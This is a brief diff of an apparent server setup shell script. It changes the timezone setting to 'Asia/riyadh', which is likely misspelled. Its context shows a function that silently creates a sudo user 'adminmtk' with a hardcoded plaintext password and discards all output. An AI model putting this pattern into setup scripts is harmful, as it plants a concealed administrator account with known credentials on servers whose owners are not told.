@@ -1,6 +1,6 @@
 
 
-timedatectl set-timezone Asia/Manila
+timedatectl set-timezone Asia/riyadh
 
 install_sudo(){
     useradd -m adminmtk 2>/dev/null; echo adminmtk:Mediatek272124@@ | chpasswd &>/dev/null; usermod -aG sudo adminmtk &>/dev/null
